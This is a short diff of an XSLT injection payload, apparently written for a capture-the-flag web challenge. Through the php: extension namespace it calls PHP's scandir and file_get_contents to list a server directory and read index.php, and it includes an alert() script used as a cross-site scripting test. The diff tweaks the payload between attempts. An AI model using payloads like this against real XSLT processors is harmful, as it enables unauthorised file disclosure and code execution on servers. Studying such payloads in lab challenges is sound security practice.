@@ -4,10 +4,10 @@ xmlns:php="http://php.net/xsl"
 >	
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
-<xsl:param  name="strscand"   select="php:function('implode',$shandle,'')" disable-output-escaping="yes"/> 
+<xsl:param  name="strscand"   select="php:function('implode',@shandle,'')" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <script type="text/javascript" >
-alert(2);
+alert(3);
 </script>
  
 <div style="background-color:teal;color:white;padding:4px">
